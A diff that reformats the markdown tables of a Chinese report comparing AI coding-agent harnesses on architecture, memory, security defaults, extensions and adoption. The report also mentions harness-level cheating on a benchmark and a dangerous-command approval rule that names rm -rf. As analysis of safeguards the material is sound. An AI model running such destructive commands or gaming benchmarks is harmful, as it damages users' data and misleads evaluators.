@@ -45,18 +45,18 @@ flowchart TD
 
 六层回答"harness 内部怎么造"，却回答不了"harness 作为产品与生态如何存活"。本报告因此在六层之上增设四个横切轴——持久化（上节已述）、架构范式、Provider 层（模型提供方抽象）、生态治理——构成完整对比坐标系。两个协议名词先予界定：MCP（Model Context Protocol）解决 agent ↔ 工具接入，ACP（Agent Client Protocol）解决编辑器 ↔ agent 接入。
 
-| 坐标轴 | 回答的问题 | 代表性观察指标 | 主要落点 |
-|---|---|---|---|
-| 感知 | 模型如何"看见"仓库 | AGENTS.md 加载层级、稳定前缀、互读他家配置（A） | 第 3–11 章感知节 |
-| 记忆 | 有限窗口如何对抗 | 触发阈值、摘要预算、关键事实追踪、prune 保护窗（A） | 第 9.2 节 |
-| 执行 | 文本如何变动作 | 工具数与 schema、编辑格式（apply_patch/hashline）、截断策略（A） | 第 3–11 章执行节 |
-| 控制 | 循环如何被驾驭 | steering、截断拒执、重放策略、doom-loop 防护（A） | 第 4.2/7.2/8.2 节 |
-| 安全 | 行动边界划在哪 | 权限引擎语义、沙箱默认档位、网络默认、审批模式（A） | 第 9.1 节 |
-| 扩展 | 能力如何生长 | 事件钩子数、MCP/ACP 站位、子代理回传形态（A/B） | 第 9.3/9.4 节 |
-| 持久化 | 任务如何活过中断 | session 格式代际、分支/resume/fork、迁移机制（A） | 第 9.3 节 |
-| 架构范式 | 代码如何组织 | 单文件教学 / 分层 monorepo / client-server / 单内核多表面 / leader+ACP 总线（A） | 第 2.3 节 |
-| Provider 层 | 模型可移植性多大 | provider 抽象、`registerProvider` 能力、厂商锁定度（A/C 分列） | 第 2.1、12.5 节 |
-| 生态治理 | 项目可持续性 | stars/npm 下载（双口径）、贡献者口径、治理事件（A） | 第 2.1、12.5 节 |
+| 坐标轴      | 回答的问题         | 代表性观察指标                                                                   | 主要落点          |
+| ----------- | ------------------ | -------------------------------------------------------------------------------- | ----------------- |
+| 感知        | 模型如何"看见"仓库 | AGENTS.md 加载层级、稳定前缀、互读他家配置（A）                                  | 第 3–11 章感知节  |
+| 记忆        | 有限窗口如何对抗   | 触发阈值、摘要预算、关键事实追踪、prune 保护窗（A）                              | 第 9.2 节         |
+| 执行        | 文本如何变动作     | 工具数与 schema、编辑格式（apply_patch/hashline）、截断策略（A）                 | 第 3–11 章执行节  |
+| 控制        | 循环如何被驾驭     | steering、截断拒执、重放策略、doom-loop 防护（A）                                | 第 4.2/7.2/8.2 节 |
+| 安全        | 行动边界划在哪     | 权限引擎语义、沙箱默认档位、网络默认、审批模式（A）                              | 第 9.1 节         |
+| 扩展        | 能力如何生长       | 事件钩子数、MCP/ACP 站位、子代理回传形态（A/B）                                  | 第 9.3/9.4 节     |
+| 持久化      | 任务如何活过中断   | session 格式代际、分支/resume/fork、迁移机制（A）                                | 第 9.3 节         |
+| 架构范式    | 代码如何组织       | 单文件教学 / 分层 monorepo / client-server / 单内核多表面 / leader+ACP 总线（A） | 第 2.3 节         |
+| Provider 层 | 模型可移植性多大   | provider 抽象、`registerProvider` 能力、厂商锁定度（A/C 分列）                   | 第 2.1、12.5 节   |
+| 生态治理    | 项目可持续性       | stars/npm 下载（双口径）、贡献者口径、治理事件（A）                              | 第 2.1、12.5 节   |
 
 坐标系设计有两条内在逻辑。第一，各轴的证据硬度不均：记忆轴与安全轴的论断可落到源码参数逐项核对（九对象参数已一致性核对），而扩展轴的部分宣称（如子代理并行度）只能依赖证伪式核实，结论强度天然低一档。第二，刻意的排除：坐标系不含"基准成绩轴"——Terminal-Bench 2.0 顶部存在 harness 级作弊（审计 1,264 条 trace，剔除确认作弊者后第一名成绩 81.8%→71.7%、名次 1→14），SWE-bench Verified 因训练污染被 OpenAI 停报，且九对象中 Pi、OMP、mini、Cline、Reasonix 无正式条目、grok-build 仅有第三方冒名条目，覆盖率本身不足以支撑排名叙事。本报告改用"自提交成绩（标注未审计）+ 采用度数据 + 可溯源口碑事件"三件套作为生态锚，例如 npm 月下载量（2026-07-17 API 口径）：@openai/codex 49.3M、opencode-ai 9.0M、pi-ai 8.6M，另有 pi-coding-agent 新旧 scope 合计约 12.4M。
 
@@ -70,14 +70,14 @@ flowchart TD
 
 #### 2.1.1 归属、语言与代码规模、许可证、采用度
 
-| 对象（仓库） | 归属/组织 | 主语言与代码规模 | 许可证 | Stars（2026-07-17） | 采用度锚点 |
-|---|---|---|---|---|---|
-| mini-coding-agent（`rasbt/mini-coding-agent`） | Sebastian Raschka 个人（独立研究者/作家） | Python 单文件 1,019 行，纯标准库、零第三方运行时依赖 | Apache-2.0 | **1,018**（forks 184；contributors 3） | 无 npm 包（纯 GitHub 教学项目）；共 15 commits，2026-04-08 后停更定型 |
-| Pi（`earendil-works/pi`） | Earendil Works（PBC；Armin Ronacher 联创，2026-04-08 收购，原作者 Mario Zechner 成股东并共掌决策） | TypeScript 五包 monorepo（ai/agent/coding-agent/tui/orchestrator）；核心 `agent-loop.ts` 792 行 | MIT（RFC 0015 承诺核心永久 MIT） | **~67.4k**（forks ~8.3k；contributors 230）；增长轨迹 48.7k（5 月）→64,158（07-09）→~67.4k（07-17）→72k（复核复拉） | npm 月下载：`pi-coding-agent` 新 scope 6.74M + 旧 scope 5.67M；`pi-ai` 8.56M（含 OpenClaw 等下游放大）；近一年 244 个 release |
-| OMP（oh-my-pi，`can1357/oh-my-pi`） | Can Bölük 个人主导 + 社区（安全研究员/逆向工程出身） | TypeScript（Bun 单进程）+ Rust natives 73,726 行（8 个第一方 crate；vendored 99,654 行另计）；营销口径"~55k/100k+"已裁定弃用 | MIT（Zechner+Bölük 双版权行） | **18,114**（forks 1,662；contributors 260，含 fork 历史贡献者） | npm `@oh-my-pi/pi-coding-agent` 242,171/月；549 个版本（2026-01-02 起，≈2–3 个/天） |
-| OpenCode（`anomalyco/opencode`） | Anomaly, Inc.（SST/Serverless Stack 团队，Y Combinator 背景） | TypeScript（Bun workspaces + turbo，30+ 包）；全仓零 .go 文件（Go TUI 已重写为 OpenTUI+Solid） | MIT | **186,615**（forks 23,401；contributors **455**——GitHub 官方口径；媒体"~900"口径未拆解，禁止混用） | npm `opencode-ai` 9.05M/月；Homebrew 30 天 32,756 安装；npm 版本条目 11,293（含预发布） |
-| Codex（`openai/codex`） | OpenAI | Rust 90+ crate（2025-06 重写完成时为 14 个；Willison SLOCCount 口径约 95.1 万行）；TS 初版已弃 | Apache-2.0（模型与云服务闭源） | **98,909**（forks 14,781；contributors 473） | npm `@openai/codex` **49.3M/月（九者第一）**；Homebrew cask 30 天 80,373；官方口径全系 5M+ 周活（B 级，未获独立验证） |
-| grok-build（`xai-org/grok-build`） | SpaceXAI（xAI 已并入 SpaceX 旗下） | Rust 844,530 行（Willison SLOCCount 口径；2,172 个 .rs 文件，含空白/注释/测试的 wc -l 口径约 133 万行）；60+ crate | Apache-2.0 | **12,895**（forks 2,253；contributors **1**——内部开发，不收外部 PR） | 无 npm 包（curl 安装脚本分发；npm 上的 `@xai-official/grok` 仅为 ACP 包装器）；2026-07-15 开源后仅 2 次 monorepo 同步 |
+| 对象（仓库）                                   | 归属/组织                                                                                          | 主语言与代码规模                                                                                                             | 许可证                           | Stars（2026-07-17）                                                                                                 | 采用度锚点                                                                                                                    |
+| ---------------------------------------------- | -------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| mini-coding-agent（`rasbt/mini-coding-agent`） | Sebastian Raschka 个人（独立研究者/作家）                                                          | Python 单文件 1,019 行，纯标准库、零第三方运行时依赖                                                                         | Apache-2.0                       | **1,018**（forks 184；contributors 3）                                                                              | 无 npm 包（纯 GitHub 教学项目）；共 15 commits，2026-04-08 后停更定型                                                         |
+| Pi（`earendil-works/pi`）                      | Earendil Works（PBC；Armin Ronacher 联创，2026-04-08 收购，原作者 Mario Zechner 成股东并共掌决策） | TypeScript 五包 monorepo（ai/agent/coding-agent/tui/orchestrator）；核心 `agent-loop.ts` 792 行                              | MIT（RFC 0015 承诺核心永久 MIT） | **~67.4k**（forks ~8.3k；contributors 230）；增长轨迹 48.7k（5 月）→64,158（07-09）→~67.4k（07-17）→72k（复核复拉） | npm 月下载：`pi-coding-agent` 新 scope 6.74M + 旧 scope 5.67M；`pi-ai` 8.56M（含 OpenClaw 等下游放大）；近一年 244 个 release |
+| OMP（oh-my-pi，`can1357/oh-my-pi`）            | Can Bölük 个人主导 + 社区（安全研究员/逆向工程出身）                                               | TypeScript（Bun 单进程）+ Rust natives 73,726 行（8 个第一方 crate；vendored 99,654 行另计）；营销口径"~55k/100k+"已裁定弃用 | MIT（Zechner+Bölük 双版权行）    | **18,114**（forks 1,662；contributors 260，含 fork 历史贡献者）                                                     | npm `@oh-my-pi/pi-coding-agent` 242,171/月；549 个版本（2026-01-02 起，≈2–3 个/天）                                           |
+| OpenCode（`anomalyco/opencode`）               | Anomaly, Inc.（SST/Serverless Stack 团队，Y Combinator 背景）                                      | TypeScript（Bun workspaces + turbo，30+ 包）；全仓零 .go 文件（Go TUI 已重写为 OpenTUI+Solid）                               | MIT                              | **186,615**（forks 23,401；contributors **455**——GitHub 官方口径；媒体"~900"口径未拆解，禁止混用）                  | npm `opencode-ai` 9.05M/月；Homebrew 30 天 32,756 安装；npm 版本条目 11,293（含预发布）                                       |
+| Codex（`openai/codex`）                        | OpenAI                                                                                             | Rust 90+ crate（2025-06 重写完成时为 14 个；Willison SLOCCount 口径约 95.1 万行）；TS 初版已弃                               | Apache-2.0（模型与云服务闭源）   | **98,909**（forks 14,781；contributors 473）                                                                        | npm `@openai/codex` **49.3M/月（九者第一）**；Homebrew cask 30 天 80,373；官方口径全系 5M+ 周活（B 级，未获独立验证）         |
+| grok-build（`xai-org/grok-build`）             | SpaceXAI（xAI 已并入 SpaceX 旗下）                                                                 | Rust 844,530 行（Willison SLOCCount 口径；2,172 个 .rs 文件，含空白/注释/测试的 wc -l 口径约 133 万行）；60+ crate           | Apache-2.0                       | **12,895**（forks 2,253；contributors **1**——内部开发，不收外部 PR）                                                | 无 npm 包（curl 安装脚本分发；npm 上的 `@xai-official/grok` 仅为 ACP 包装器）；2026-07-15 开源后仅 2 次 monorepo 同步         |
 
 这张表最有信息量的不是各行本身，而是行间的三处"排序错位"。其一，stars 与下载量排序不一致：stars 冠军 OpenCode（186,615）的 npm 月下载（9.05M）仅为 Codex（49.3M）的约 18%——stars 度量的是社区情感与事件驱动关注（OpenCode 在 Anthropic 封禁事件后两周 +18,000 stars），npm 下载更接近"装机使用"，而 Codex 的下载量又被 ChatGPT 订阅捆绑与 npm 壳分发方式显著放大；Pi 的 8.56M `pi-ai` 月下载含 OpenClaw 等下游依赖放大，不能全数记为 CLI 用户；grok-build 干脆无 npm 包，其 12,895 stars 对应的仅是开源两天的窗口。其二，代码量与采用度同样不成比例：84.4 万行的 grok-build stars 倒数第二，1,019 行的 mini 却被技能市场当作 canonical 教材——体量既不决定智能（那是模型的职责），也不决定影响力。其三，contributors 列暴露治理模式的两极：grok-build 的"1"代表内部 monorepo 周期同步的"源码透明但不开放开发"，OpenCode 的 455 代表周合并约 191 PR 的开放社区，而 OMP 的 260 里还混着 fork 继承的上游历史。语言层面的双极化同样值得预先标注：两家大厂为沙箱原语与性能选 Rust（Codex 官方明言 "Rust has first-class support for the primitives we need"），两家社区项目为迭代速度与生态复用选 TypeScript，OMP 则以 N-API Rust natives 在 TS 主体内嵌性能关键路径，是两条路线的杂交样本。
 
@@ -93,17 +93,17 @@ flowchart TD
 
 下表把九对象放进同一矩阵，维度口径以第 1 章修订后的六层框架为准——感知、记忆、执行、控制、安全、扩展六层，持久化作横切维度而非独立层：agent loop 形态、steering、截断拒执等控制层要素并入"执行·控制"列呈现，子代理编排随其机制归属见"执行·控制"或"扩展"列；"持久化"以横切维度单列。第 3–11 章各对象的"六维拆解"小节沿用同一口径，其中的"持久化"标签含义与此相同（横切维度标签，非第 1 章意义上的独立层）。单元格为一句话定性加关键参数，全部锚定 2026-07-17 版本快照；逐项源码证据见对应对象章节与第 12 章横评。
 
-| 对象 | 感知 | 记忆 | 执行·控制 | 安全 | 持久化（横切） | 扩展 |
-|---|---|---|---|---|---|---|
-| mini-coding-agent | git 状态+AGENTS.md（截 1,200 字符）拼成稳定前缀，无检索/RAG | 无 LLM 摘要；字符闸硬截断（单输出 4,000／历史 12,000 字符）+近 6 条富保留 | 7 工具+自造 DSL schema+`<tool>` 文本协议+五步闸管线 | 人审为核心（ask/auto/never 三态）+inode 级路径边界，无沙箱 | SessionStore JSON 双结构（messages+working memory），支持 resume | 仅只读单层 delegate；无插件/MCP/skills 任何机制 |
-| Pi | AGENTS.md/CLAUDE.md 祖先目录 walk-up，明示不经 trust 门控（注入取舍） | 单级 LLM compaction（>窗口−16,384 tokens 触发、尾部保 20,000 tokens）+branchSummary | 四工具极简 loop（read/write/edit/bash），工具定义 <1,000 tokens；steering 插话、length 截断整批拒执 | 零内置权限（哲学取舍），官方文档推荐外置隔离；扩展面 2 个已修 CVE | 树形 JSONL v3（带 v1→v3 迁移） | 8 类 ~30 事件扩展 API、registerProvider、skills/themes；被 fork/嵌入最多（OMP、OpenClaw 等） |
-| OMP | 16 路 discovery 继承各家配置（优先级 native 100>claude 80>agents/codex 70>…） | snapcompact 位图压缩（免 LLM、零摘要预算）+TTSR 流内规则注入存活 | 27 公开+2 隐藏工具、hashline 锚定编辑、LSP 14 ops/DAP 28 ops | 三级审批+ACP 权限路由，但默认 yolo | JSONL 会话树（继承 Pi 模型，工程化大幅加深） | 与 Pi 同构扩展 API+Claude 兼容 marketplace；一等 task 子代理+schema 化 yield+pi-iso 七后端隔离 |
-| OpenCode | AGENTS.md 主+CLAUDE.md 兼容（可关）+glob；LSP 诊断回喂为独家能力 | 两级策略：prune（40k/20k，默认关）+anchored summary（六段模板、clamp 25%/2k/8k） | 工具面+provider 归一抽象（models.dev 注册表），多模型自由切换套利 | 权限引擎"最后匹配获胜"（findLast），官方自认 UX 层非安全边界；无 OS 沙箱 | JSON→SQLite（v1.2.0）迁移，曾发生增量升级丢会话事故；事件溯源 sync | npm/目录双源插件、20+ 顺序钩子（permission.ask、compacting 等）、MCP |
-| Codex | AGENTS.md 发起者；三层加载+prompt-cache 优化（monorepo 内 88 个嵌套文件） | 三路径 compact（含 /responses/compact 加密 item，不可审计）；阈值按模型自动 | 无状态整段重放 loop；apply_patch（Lark 文法约束解码）为编辑原语；模型-工具联合训练 | 三档沙箱×四档审批、Seatbelt/bwrap+seccomp/受限令牌、execpolicy Starlark、默认断网——九者最强默认 | rollout JSONL，resume/fork | MCP 双角色+hooks/skills/plugin；硬拒 ACP（issue #9085 关闭为 not planned） |
-| grok-build | 公开读取 CLAUDE.md/.cursor/rules 等他家配置+/import-claude 导入 | 85% 阈值自动压缩+memory flush+two-pass prefire；300s 墙钟摘要预算 | 三道闸循环+doom-loop 中止；25+ 工具、三套编辑策略、worktree 隔离并行子代理（媒体"8 路"系泄露 UI 数字，代码无硬上限） | 机制最全但沙箱默认 off；遥测上传事件后服务端关停 trace_upload | JSONL+FTS 全文检索；/resume /fork /rewind /share；云端沙箱会话恢复 | 插件 marketplace（强制 commit SHA pin）、subagent bundle、MCP、hooks |
-| Claude Code | CLAUDE.md 三级层级加载（项目/用户/管理）；不认 AGENTS.md | 五层 compaction pipeline（每次模型调用前按序运行、逐级激进）+auto-compact ≈50% 阈值+/compact 定向压缩 | queryLoop 单循环（interactive/headless/SDK/IDE 同核异渲染）+TodoWrite 任务追踪+Agent Teams（git worktree 隔离多实例） | 七层独立安全层（预过滤→deny-first 规则→ML 分类器→shell 沙箱）；四模式；已知 pre-trust 窗口 CVE 两类 | session 恢复+CLAUDE.md 记忆；subagent 隔离上下文只回摘要 | MCP（stdio/SSE/HTTP）+plugins+skills（SKILL.md 按需加载）+hooks（10+ 事件，PreToolUse 可阻断） |
-| Cline | @url/@file/@folder/@problems 显式注入+AST 搜索 | 无自动 compaction 公开机制；.clinerules+Memory Bank 人工记忆 | Plan/Act 双模签名设计（两模式可挂不同模型）；implement-test-fix 循环；coordinator agents+cron 调度（v3.58 起 subagents） | 审批密度九对象之最：细粒度 auto-approve 分类（read/write/execute/browser/MCP）+危险命令硬闸（rm -rf 等永远需批准）；无执行隔离沙箱 | shadow git checkpoints：每次工具调用后快照，三级回滚（Files/Task/Full） | MCP Marketplace 150+ 服务器一键装；浏览器自动化（headless Chromium）；skills |
-| Reasonix | CodeGraph（tree-sitter 符号/调用图索引，刻意非 embedding）；REASONIX.md 层级+auto-memory | append-only 只追加（对齐字节稳定 prefix-cache）+低频 compaction；R1 推理内容蒸馏后才入 log | 并行安全工具分组并发、写操作串行；工具调用修复管道四道（flatten/scavenge/truncation/storm）；双模型协作（执行器+规划器各自缓存稳定 session） | allow/ask/deny 规则+workspace sandbox（写限 workspace）+plan mode 只读审计闸 | checkpoints & rewind（Esc-Esc 或 /rewind）；session replay 与统计 | MCP first-class（stdio/SSE/Streamable HTTP，兼容 .mcp.json）+Markdown skills+hooks+slash 命令+@file |
+| 对象              | 感知                                                                                     | 记忆                                                                                                  | 执行·控制                                                                                                                                    | 安全                                                                                                                               | 持久化（横切）                                                          | 扩展                                                                                                |
+| ----------------- | ---------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
+| mini-coding-agent | git 状态+AGENTS.md（截 1,200 字符）拼成稳定前缀，无检索/RAG                              | 无 LLM 摘要；字符闸硬截断（单输出 4,000／历史 12,000 字符）+近 6 条富保留                             | 7 工具+自造 DSL schema+`<tool>` 文本协议+五步闸管线                                                                                          | 人审为核心（ask/auto/never 三态）+inode 级路径边界，无沙箱                                                                         | SessionStore JSON 双结构（messages+working memory），支持 resume        | 仅只读单层 delegate；无插件/MCP/skills 任何机制                                                     |
+| Pi                | AGENTS.md/CLAUDE.md 祖先目录 walk-up，明示不经 trust 门控（注入取舍）                    | 单级 LLM compaction（>窗口−16,384 tokens 触发、尾部保 20,000 tokens）+branchSummary                   | 四工具极简 loop（read/write/edit/bash），工具定义 <1,000 tokens；steering 插话、length 截断整批拒执                                          | 零内置权限（哲学取舍），官方文档推荐外置隔离；扩展面 2 个已修 CVE                                                                  | 树形 JSONL v3（带 v1→v3 迁移）                                          | 8 类 ~30 事件扩展 API、registerProvider、skills/themes；被 fork/嵌入最多（OMP、OpenClaw 等）        |
+| OMP               | 16 路 discovery 继承各家配置（优先级 native 100>claude 80>agents/codex 70>…）            | snapcompact 位图压缩（免 LLM、零摘要预算）+TTSR 流内规则注入存活                                      | 27 公开+2 隐藏工具、hashline 锚定编辑、LSP 14 ops/DAP 28 ops                                                                                 | 三级审批+ACP 权限路由，但默认 yolo                                                                                                 | JSONL 会话树（继承 Pi 模型，工程化大幅加深）                            | 与 Pi 同构扩展 API+Claude 兼容 marketplace；一等 task 子代理+schema 化 yield+pi-iso 七后端隔离      |
+| OpenCode          | AGENTS.md 主+CLAUDE.md 兼容（可关）+glob；LSP 诊断回喂为独家能力                         | 两级策略：prune（40k/20k，默认关）+anchored summary（六段模板、clamp 25%/2k/8k）                      | 工具面+provider 归一抽象（models.dev 注册表），多模型自由切换套利                                                                            | 权限引擎"最后匹配获胜"（findLast），官方自认 UX 层非安全边界；无 OS 沙箱                                                           | JSON→SQLite（v1.2.0）迁移，曾发生增量升级丢会话事故；事件溯源 sync      | npm/目录双源插件、20+ 顺序钩子（permission.ask、compacting 等）、MCP                                |
+| Codex             | AGENTS.md 发起者；三层加载+prompt-cache 优化（monorepo 内 88 个嵌套文件）                | 三路径 compact（含 /responses/compact 加密 item，不可审计）；阈值按模型自动                           | 无状态整段重放 loop；apply_patch（Lark 文法约束解码）为编辑原语；模型-工具联合训练                                                           | 三档沙箱×四档审批、Seatbelt/bwrap+seccomp/受限令牌、execpolicy Starlark、默认断网——九者最强默认                                    | rollout JSONL，resume/fork                                              | MCP 双角色+hooks/skills/plugin；硬拒 ACP（issue #9085 关闭为 not planned）                          |
+| grok-build        | 公开读取 CLAUDE.md/.cursor/rules 等他家配置+/import-claude 导入                          | 85% 阈值自动压缩+memory flush+two-pass prefire；300s 墙钟摘要预算                                     | 三道闸循环+doom-loop 中止；25+ 工具、三套编辑策略、worktree 隔离并行子代理（媒体"8 路"系泄露 UI 数字，代码无硬上限）                         | 机制最全但沙箱默认 off；遥测上传事件后服务端关停 trace_upload                                                                      | JSONL+FTS 全文检索；/resume /fork /rewind /share；云端沙箱会话恢复      | 插件 marketplace（强制 commit SHA pin）、subagent bundle、MCP、hooks                                |
+| Claude Code       | CLAUDE.md 三级层级加载（项目/用户/管理）；不认 AGENTS.md                                 | 五层 compaction pipeline（每次模型调用前按序运行、逐级激进）+auto-compact ≈50% 阈值+/compact 定向压缩 | queryLoop 单循环（interactive/headless/SDK/IDE 同核异渲染）+TodoWrite 任务追踪+Agent Teams（git worktree 隔离多实例）                        | 七层独立安全层（预过滤→deny-first 规则→ML 分类器→shell 沙箱）；四模式；已知 pre-trust 窗口 CVE 两类                                | session 恢复+CLAUDE.md 记忆；subagent 隔离上下文只回摘要                | MCP（stdio/SSE/HTTP）+plugins+skills（SKILL.md 按需加载）+hooks（10+ 事件，PreToolUse 可阻断）      |
+| Cline             | @url/@file/@folder/@problems 显式注入+AST 搜索                                           | 无自动 compaction 公开机制；.clinerules+Memory Bank 人工记忆                                          | Plan/Act 双模签名设计（两模式可挂不同模型）；implement-test-fix 循环；coordinator agents+cron 调度（v3.58 起 subagents）                     | 审批密度九对象之最：细粒度 auto-approve 分类（read/write/execute/browser/MCP）+危险命令硬闸（rm -rf 等永远需批准）；无执行隔离沙箱 | shadow git checkpoints：每次工具调用后快照，三级回滚（Files/Task/Full） | MCP Marketplace 150+ 服务器一键装；浏览器自动化（headless Chromium）；skills                        |
+| Reasonix          | CodeGraph（tree-sitter 符号/调用图索引，刻意非 embedding）；REASONIX.md 层级+auto-memory | append-only 只追加（对齐字节稳定 prefix-cache）+低频 compaction；R1 推理内容蒸馏后才入 log            | 并行安全工具分组并发、写操作串行；工具调用修复管道四道（flatten/scavenge/truncation/storm）；双模型协作（执行器+规划器各自缓存稳定 session） | allow/ask/deny 规则+workspace sandbox（写限 workspace）+plan mode 只读审计闸                                                       | checkpoints & rewind（Esc-Esc 或 /rewind）；session replay 与统计       | MCP first-class（stdio/SSE/Streamable HTTP，兼容 .mcp.json）+Markdown skills+hooks+slash 命令+@file |
 
 按列通读，这张矩阵给出六条横切线索——其中安全、记忆、持久化与子代理回传四条在第 12 章展开为独立横评，感知互读与编辑原语两条在第 13 章（I3/I4）展开。安全列呈现完整的默认姿态谱系——Codex 默认断网沙箱、OpenCode 自认权限只是 UX 层、grok-build 机制最全却默认关闭、OMP 默认 yolo、Pi 零内置权限、mini 退回人审——该谱系与 §2.1.2 的定价谱系精确同构，支持"默认姿态是客户选择的结果而非工程能力排序"的论断。记忆列是同一问题的六代工程解：从字符闸硬截断（mini）、单级 LLM compaction（Pi）、prune+anchored summary 两级策略（OpenCode）、按模型自动+云端加密 item（Codex）、85% 阈值三道闸（grok-build），到免 LLM 的位图压缩（OMP），成本、可审计性与破坏性各异。感知列显示配置互读已成行业默契：grok-build 公开读取 .claude/.cursor 规则、OMP 以 16 路 discovery 继承几乎全套竞品配置、OpenCode 兼容 CLAUDE.md——指令层标准化完成后迁移成本趋零。执行·控制列的真正分歧在编辑原语：朴素 replace/patch 文本（mini/Pi/OpenCode）、Lark 文法约束解码（Codex apply_patch）、hash 锚定行编辑（OMP hashline）、三套编辑策略并存（grok-build）。横切的持久化列呈现五代存储范式：单文件 JSON → 树形 JSONL → SQLite → 云端可恢复会话。三家新对象把各列谱系继续撑满：安全列的最右端由 Claude Code 的七层纵深占据，审批密度极值则由 Cline 拿到；记忆列新增两个新物种——Claude Code 的五层递进管道与 Reasonix 面向缓存的 append-only 纪律，后者第一次把"不修改历史"从工程习惯升格为架构不变量；持久化列的 shadow git checkpoints（Cline）与 Esc-Esc rewind（Reasonix）证明"可回滚性"已从差异化卖点变成生产 harness 的标配叙事；感知列的 CodeGraph（Reasonix）则给出了检索路线的第三条答案——不用 RAG embedding，也不用纯 AGENTS.md 前缀，而是 tree-sitter 符号级索引。扩展列则记录子代理结果回传从 prose 走向 schema/协议化的趋势：mini/grok-build/OpenCode 为 prose 回传，Codex 为协议级 `InterAgentCommunication` 条目，OMP 为 schema 化 `yield`。
 
@@ -138,17 +138,17 @@ graph TD
     end
 ```
 
-| 范式 | 对象 | 拓扑与进程模型 | 内核语言 | 表面/入口 | 引擎对外线协议 |
-|---|---|---|---|---|---|
-| 单文件教学 | mini-coding-agent | 单进程单文件 REPL，无 client/server 之分 | Python（stdlib） | 交互式 CLI 唯一表面 | 无协议层（教学场景直接省略） |
-| 分层 monorepo（单进程） | Pi | 单 Node/Bun 进程内五包分层（ai→agent→coding-agent→tui，外加 experimental orchestrator） | TypeScript | TUI / print 非交互 / RPC 模式 / SDK | NDJSON RPC（`--mode rpc`，JSONL stdio） |
-| 分层 monorepo 变体：fork 同构+原生插件 | OMP | 单 Bun 进程继承 Pi 分层，性能路径下沉为 N-API Rust addon（73.7k 行，平台 leaf 包分发） | TypeScript+Rust | interactive / one-shot / RPC / ACP 四入口 | NDJSON RPC（独有 host tools/URI 注册：宿主进程任意语言可向 agent 注册工具）+原生 ACP |
-| client/server HTTP 服务化 | OpenCode | Bun server（Effect HttpApi，17 个 route group）+多客户端；`bun build --compile` 出单文件二进制 | TypeScript（零 Go） | TUI / Desktop(Electron) / Web / IDE / Slack / GitHub Action / SDK | HTTP/OpenAPI 3.1（`/doc`）+SSE `/event`；SDK 由同一 OpenAPI 生成 |
-| 单内核多表面 | Codex | `codex-core` 单内核（Op/EventMsg 队列），App Server 负责对外协议翻译；本地/cloud 双运行面 | Rust（90+ crate） | CLI / TUI / IDE / cloud / exec / GitHub Action / SDK / mcp-server 八表面 | 自建 JSON-RPC App Server（承诺向后兼容；ACP feature request 关闭为 not planned） |
-| leader 守护进程+ACP 内部总线 | grok-build | leader 长驻守护进程（Unix socket+LeaderLock 单例、每小时自更新检查），TUI/headless/编辑器皆为 ACP 客户端 | Rust（60+ crate） | TUI（pager）/ headless / ACP 嵌入（Zed 等编辑器） | ACP（JSON-RPC 2.0 over stdio/socket）内化为进程总线，非仅对外编辑器协议 |
-| 单内核多表面（闭源同族） | Claude Code | `queryLoop()` async generator 单循环，interactive/headless/SDK/IDE 共享同一循环，仅渲染层不同 | 闭源（未公开） | Terminal CLI / IDE（VS Code、JetBrains）/ SDK / Web / Desktop / Slack / GitHub @claude | 内部流式协议；对外经 SDK 与 MCP 暴露 |
-| IDE 原生扩展 | Cline | 扩展宿主进程内运行（webview UI+扩展宿主执行），shadow git 旁挂仓库做快照；CLI 2.0 独立 headless 进程 | TypeScript | VS Code 系 IDE / JetBrains（early access）/ CLI 2.0 | 无公开线协议（扩展内直调；CLI 复用同核） |
-| 单二进制+缓存不变量 | Reasonix | 单 Go 静态二进制（CGO_ENABLED=0），`reasonix serve` 可起本地 Web UI；ACP 接入编辑器 | Go（1.0 重写；0.x TS legacy） | TUI / Desktop / Web / ACP / Feishu·Lark·WeChat bot | ACP（编辑器）+本地 HTTP（serve） |
+| 范式                                   | 对象              | 拓扑与进程模型                                                                                           | 内核语言                      | 表面/入口                                                                              | 引擎对外线协议                                                                       |
+| -------------------------------------- | ----------------- | -------------------------------------------------------------------------------------------------------- | ----------------------------- | -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
+| 单文件教学                             | mini-coding-agent | 单进程单文件 REPL，无 client/server 之分                                                                 | Python（stdlib）              | 交互式 CLI 唯一表面                                                                    | 无协议层（教学场景直接省略）                                                         |
+| 分层 monorepo（单进程）                | Pi                | 单 Node/Bun 进程内五包分层（ai→agent→coding-agent→tui，外加 experimental orchestrator）                  | TypeScript                    | TUI / print 非交互 / RPC 模式 / SDK                                                    | NDJSON RPC（`--mode rpc`，JSONL stdio）                                              |
+| 分层 monorepo 变体：fork 同构+原生插件 | OMP               | 单 Bun 进程继承 Pi 分层，性能路径下沉为 N-API Rust addon（73.7k 行，平台 leaf 包分发）                   | TypeScript+Rust               | interactive / one-shot / RPC / ACP 四入口                                              | NDJSON RPC（独有 host tools/URI 注册：宿主进程任意语言可向 agent 注册工具）+原生 ACP |
+| client/server HTTP 服务化              | OpenCode          | Bun server（Effect HttpApi，17 个 route group）+多客户端；`bun build --compile` 出单文件二进制           | TypeScript（零 Go）           | TUI / Desktop(Electron) / Web / IDE / Slack / GitHub Action / SDK                      | HTTP/OpenAPI 3.1（`/doc`）+SSE `/event`；SDK 由同一 OpenAPI 生成                     |
+| 单内核多表面                           | Codex             | `codex-core` 单内核（Op/EventMsg 队列），App Server 负责对外协议翻译；本地/cloud 双运行面                | Rust（90+ crate）             | CLI / TUI / IDE / cloud / exec / GitHub Action / SDK / mcp-server 八表面               | 自建 JSON-RPC App Server（承诺向后兼容；ACP feature request 关闭为 not planned）     |
+| leader 守护进程+ACP 内部总线           | grok-build        | leader 长驻守护进程（Unix socket+LeaderLock 单例、每小时自更新检查），TUI/headless/编辑器皆为 ACP 客户端 | Rust（60+ crate）             | TUI（pager）/ headless / ACP 嵌入（Zed 等编辑器）                                      | ACP（JSON-RPC 2.0 over stdio/socket）内化为进程总线，非仅对外编辑器协议              |
